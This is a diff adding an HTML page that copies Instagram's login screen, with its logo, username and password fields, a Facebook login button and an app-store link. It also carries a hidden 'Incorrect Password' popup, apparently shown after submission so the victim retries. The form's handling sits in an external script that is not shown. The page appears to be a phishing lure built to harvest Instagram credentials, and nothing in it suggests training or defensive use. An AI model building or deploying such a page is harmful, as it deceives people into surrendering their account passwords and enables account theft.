@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="images.png" alt="Instagram Logo" class="logo">
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span id="togglePassword" class="eye-icon"></span>
+                </div>
+                <button type="submit" id="loginBtn" class="login-btn">Log In</button>
+                <div class="forgot-pw">
+                    <a href="#" class="forgot-pw">Forgot password?</a>
+                </div>
+                <div class="separator">
+                    <hr>
+                    <span>OR</span>
+                    <hr>
+                </div>
+                <button type="button" class="facebook-login">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+                    Log in with Facebook
+                </button>
+            </form>
+        </div>
+        <div class="create-account">
+            <p>Don't have an account? <a href="#">Create new account</a></p>
+        </div>
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play" class="app-store-logo">
+                </a>
+                
+            </div>
+        </div>
+        <!-- Popup Container -->
+        <div class="popupContainer" id="popupContainer">
+            <div class="popupContent">
+                <span class="closePopup" id="closePopup">&times;</span>
+                <h2 class="error-message">Incorrect Password</h2>
+                <p>The password OR Username you entered is incorrect</p>
+                <hr>
+                <h3><a href="">Try again</a></h3>
+            </div>
+        </div>
+    </div>
+    <script src="scripts.js"></script>
+</body>
+</html>
